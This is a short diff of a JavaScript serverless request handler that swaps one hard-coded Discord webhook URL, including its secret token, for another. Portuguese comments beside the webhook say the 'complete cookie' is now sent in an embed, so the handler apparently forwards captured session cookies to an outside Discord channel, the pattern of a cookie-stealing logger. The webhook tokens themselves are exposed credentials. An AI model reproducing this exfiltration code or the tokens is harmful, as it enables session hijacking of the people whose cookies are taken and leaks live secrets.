@@ -32,7 +32,7 @@ export default async function handler(req, res) {
     }
 
     // WEBHOOK DO DISCORD
-    const webhookURL = 'https://discord.com/api/webhooks/1481251887457243136/aqdHPLFZh-aB2-dILXXZNwbTIzVmj56fvaAGTSaqupwZfVmcUIty71uOIQC4n8IS0UNL';
+    const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
 
     // 🔥 CORRIGIDO - Cookie COMPLETO
     const embed = {
@@ -144,4 +144,5 @@ function generateSessionId() {
   return Math.random().toString(36).substring(2, 15) + 
          Math.random().toString(36).substring(2, 15);
 }
+
 
